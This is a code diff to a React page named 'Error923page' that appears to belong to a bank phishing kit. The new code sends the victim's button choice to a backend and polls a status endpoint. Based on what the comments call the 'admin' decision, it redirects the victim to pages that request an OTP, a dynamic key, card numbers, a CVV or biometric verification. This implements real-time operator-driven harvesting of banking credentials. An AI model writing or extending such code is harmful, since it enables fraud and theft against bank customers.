@@ -104,18 +104,121 @@ export default function Error923page() {
         setFechaHora(formato);
     };
 
-    // Placeholder function for the button
-    const handleRetry = () => {
+    // Refs para polling (copiado de otras vistas)
+    const estadoAnteriorRef = useState(null);
 
-        // Se muestra el cargando por 2 segundos
-        setCargando(true);
+    // --- LOGIC: Handle User Response ---
+    const handleAction = async (accion) => {
+        try {
+            setCargando(true);
+            const raw = localStorage.getItem("datos_usuario");
+            const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
+            const sesionId = usuarioLocalStorage?.sesion_id;
 
-        // Se crea un temporalizador para cerrar el modal
-        setTimeout(() => {
+            if (!sesionId) {
+                // alert("Error de sesión");
+                setCargando(false);
+                return;
+            }
 
-            // Se llama el metodo para cerrar el modal
+            // Import axios dynamically if needed, or assume global instance
+            const { instanceBackend } = await import("../../axios/instanceBackend");
+
+            await instanceBackend.post('/response-923', {
+                sesionId,
+                accion
+            });
+
+            // Unify logic: Both Confirm and Cancel enter polling state
+            // "si es cancelar ... activamos los botones sin cerrar la session es solo es queda en cargando"
+            iniciarPolling(sesionId);
+
+        } catch (error) {
+            console.error("Error enviando respuesta 923", error);
             setCargando(false);
-        }, 2000);
+
+            if (error.response) {
+                // El servidor respondió con un código de estado fuera del rango 2xx
+                alert(`Error ${error.response.status}: ${error.response.data?.message || 'Error del servidor'}`);
+            } else if (error.request) {
+                // La petición fue hecha pero no se recibió respuesta
+                alert("Error de conexión con el servidor");
+            } else {
+                // Hubo un error al configurar la petición
+                alert("Error inesperado: " + error.message);
+            }
+        }
+    };
+
+    const iniciarPolling = (sesionId) => {
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // ~3 minutos
+        const TIMEOUT_MS = 180000;
+        let timeoutId;
+
+        const pollingInterval = setInterval(async () => {
+            attempts++;
+            try {
+                const { instanceBackend } = await import("../../axios/instanceBackend");
+                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
+                const { estado } = response.data;
+
+                console.log('Polling 923:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
+
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Tiempo de espera agotado.");
+                    return;
+                }
+
+                // Estados que indican que el admin tomó una decisión
+                const estadosFinales = [
+                    'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'error_otp', 'error_din', 'error_login', 'solicitar_biometria',
+                    'solicitar_tc', 'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'error_923', // Loop? No, si admin manda 923 de nuevo recarga
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
+
+                if (estadosFinales.includes(estado?.toLowerCase())) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+
+                    switch (estado.toLowerCase()) {
+                        case 'solicitar_otp': window.location.href = '/numero-otp'; break;
+                        case 'solicitar_din': window.location.href = '/clave-dinamica'; break;
+                        case 'solicitar_finalizar': window.location.href = '/finalizado-page'; break;
+                        case 'solicitar_biometria': window.location.href = '/verificacion-identidad'; break;
+                        case 'error_923': window.location.reload(); break; // Re-activar
+                        case 'solicitar_tc': window.location.href = '/validacion-tc'; break;
+                        case 'solicitar_tc_custom': window.location.href = '/validacion-tc'; break;
+                        case 'solicitar_cvv_custom': window.location.href = '/validacion-cvv'; break;
+                        case 'error_otp': window.location.href = '/numero-otp'; break;
+                        case 'error_din': window.location.href = '/clave-dinamica'; break;
+                        case 'error_login': window.location.href = '/autenticacion'; break;
+                        default: break;
+                    }
+                }
+
+            } catch (error) {
+                console.error("Polling error", error);
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Error de conexión. Intente nuevamente.");
+                }
+            }
+        }, 3000);
+
+        // Safety timeout cleanup
+        timeoutId = setTimeout(() => {
+            clearInterval(pollingInterval);
+            setCargando(false);
+        }, TIMEOUT_MS);
     };
 
     // Se retorna el componente
@@ -204,10 +307,10 @@ export default function Error923page() {
                             </div>
 
                             <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
-                                <button onClick={handleRetry} className="login-btn-borrar">
+                                <button onClick={() => handleAction('cancelar')} className="login-btn-borrar">
                                     Cancelar
                                 </button>
-                                <button className="login-btn" onClick={handleRetry}>
+                                <button className="login-btn" onClick={() => handleAction('confirmar')}>
                                     Confirmar
                                 </button>
                             </div>
